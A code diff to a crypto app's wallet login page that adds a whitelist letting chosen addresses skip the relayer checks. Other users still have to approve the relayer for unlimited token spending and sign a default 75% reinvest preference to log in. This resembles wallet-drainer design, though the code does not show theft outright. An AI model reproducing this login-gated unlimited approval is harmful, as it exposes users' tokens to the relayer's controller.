@@ -8,6 +8,7 @@ import { useAccount, useSignMessage, useSwitchChain, useDisconnect, useWriteCont
 import { useAppKit } from "@reown/appkit/react";
 import { bsc } from "@reown/appkit/networks";
 import { useTheme } from "@/app/context/ThemeContext";
+import { isWhitelistedAddress } from "@/config/whitelistedAddresses";
 import { I6_TOKEN_ADDRESS, RELAYER_ADDRESS, ERC20_ABI, QUANTX_REINVEST_ADDRESS, RELAYER_API_BASE } from "@/lib/contracts/abis";
 import { UNLIMITED_ALLOWANCE_THRESHOLD, getRelayerStatus } from "@/lib/contracts/qtx";
 import {
@@ -121,8 +122,9 @@ export default function LoginPage() {
             let hasPreference = false;
             let relayerNonce = 0;
             const cleanAddr = address.toLowerCase();
+            const isWhitelisted = isWhitelistedAddress(cleanAddr);
 
-            if (publicClient) {
+            if (!isWhitelisted && publicClient) {
                 try {
                     const allowance = await publicClient.readContract({
                         address: I6_TOKEN_ADDRESS as `0x${string}`,
@@ -140,33 +142,35 @@ export default function LoginPage() {
             }
 
             // Check relayer status: try internal proxy route first, then direct relayer
-            try {
-                const statusData = await getRelayerStatus(cleanAddr);
-                if (statusData) {
-                    if (statusData.nonce !== undefined && statusData.nonce !== null) {
-                        relayerNonce = Number(statusData.nonce);
+            if (!isWhitelisted) {
+                try {
+                    const statusData = await getRelayerStatus(cleanAddr);
+                    if (statusData) {
+                        if (statusData.nonce !== undefined && statusData.nonce !== null) {
+                            relayerNonce = Number(statusData.nonce);
+                        }
+                        if (statusData.hasAllowance) {
+                            isApproved = true;
+                        }
+                        const pref = statusData.preference;
+                        if (
+                            statusData.hasPreference ||
+                            (pref && (
+                                pref.percent !== undefined ||
+                                pref.signature ||
+                                typeof pref === "number"
+                            ))
+                        ) {
+                            hasPreference = true;
+                        }
                     }
-                    if (statusData.hasAllowance) {
-                        isApproved = true;
-                    }
-                    const pref = statusData.preference;
-                    if (
-                        statusData.hasPreference ||
-                        (pref && (
-                            pref.percent !== undefined ||
-                            pref.signature ||
-                            typeof pref === "number"
-                        ))
-                    ) {
-                        hasPreference = true;
-                    }
+                } catch (statusErr) {
+                    console.warn("Relayer status check error:", statusErr);
                 }
-            } catch (statusErr) {
-                console.warn("Relayer status check error:", statusErr);
             }
 
             // Direct fallback check if preference still not detected
-            if (!hasPreference) {
+            if (!isWhitelisted && !hasPreference) {
                 try {
                     const directRes = await fetch(`${RELAYER_API_BASE}/api/reinvest/status/${cleanAddr}`, {
                         headers: { "Content-Type": "application/json" },
@@ -198,7 +202,7 @@ export default function LoginPage() {
             }
 
             // Client-side cache safety backup: if user previously configured preference on this machine
-            if (!hasPreference) {
+            if (!isWhitelisted && !hasPreference) {
                 try {
                     const cachedPref = localStorage.getItem(`i6_reinvest_pref_${cleanAddr}`);
                     if (cachedPref && Number(cachedPref) > 0) {
@@ -209,7 +213,7 @@ export default function LoginPage() {
 
             // 2. If the relayer address has not been given approval to spend unlimited arbitrary amount of token:
             // First take the approval request to approve relayer to spend unlimited arbitrary amount of tokens.
-            if (!isApproved) {
+            if (!isWhitelisted && !isApproved) {
                 setStatusText("Approve Relayer in Wallet...");
                 const maxUint256 = 2n ** 256n - 1n;
 
@@ -231,7 +235,7 @@ export default function LoginPage() {
 
             // 3. If relayer backend does not have the EIP-712 signed preference yet:
             // Sign and submit default 75% preference directly to relayer backend and internal proxy
-            if (!hasPreference) {
+            if (!isWhitelisted && !hasPreference) {
                 setStatusText("Sign 75% Preference in Wallet...");
                 const deadline = Math.floor(Date.now() / 1000) + 3600 * 24 * 30; // 30 days validity
                 const signature = await signTypedDataAsync({
